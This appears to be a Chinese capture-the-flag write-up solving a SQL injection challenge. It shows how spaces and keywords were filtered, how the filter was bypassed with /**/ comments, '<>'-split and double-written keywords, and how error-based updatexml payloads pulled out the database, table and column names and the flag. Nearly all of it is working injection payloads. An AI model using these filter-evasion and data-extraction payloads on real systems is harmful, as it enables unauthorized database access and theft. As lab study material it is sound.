1. 真的注入

1.1. 测试
burp sql注入测试

！，like 正产显示

or等关键词 被标记

空格被标记，

<>"'%;)(&+ 结果为"'%;)(&+ 证明<>被过滤 

&没被过滤

标记词+过滤词在sql注入中是一对很好的组合


1.2. 尝试绕过
```
空格可以用/**/代替
key=!'/**/o<>r/**/1%23      显示全部，绕过成功
key=!'/**/o<>rder/**/by/**/1%23 正确
key=!'/**/o<>rder/**/by/**/5%23 报错
key=!'/**/o<>rder/**/by/**/3%23 正确
key=!'/**/o<>rder/**/by/**/4%23 错误

看来只有三列

key=!'/**/u<>noin/**/se<>lect/**/1,2,3%23 出错，难道限制了联合查询？
尝试报错注入

key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/database()),0x3e),0x3e)%23 #成功，数据库名，webflag
key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/group_concat(table_name)/**/from/**/info<>rmation_schema.tables/**/where/**/table_schema=database()),0x3e),0x3e)%23 #表名flag_0d9a,news
key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/group_concat(column_name)/**/from/**/info<>rmation_schema.columns/**/where/**/table_name=%27flag_0d9a%27),0x3e),0x3e)%23  #被标记
key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/group_concat(column_name)/**/from/**/info<>rmation_schema.columns/**/where/**/table_name=0x666c61675f30643961),0x3e),0x3e)%23  #columns,column_name被过滤，报错
 
key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/group_concat(columcolumn_namen_name)/**/from/**/info<>rmation_schema.colucolumnsmns/**/where/**/table_name='flag_0d9a'),0x3e),0x3e)%23  #正确，字段名为flag

key=!'/**/an<>d/**/updatexml(0x3e,concat(0x3e,(sel<>ect/**/flag/**/from/**/flag_0d9a),0x3e),0x3e)%23  #flag:whale{hRzfVlzK95LVaASs}


```
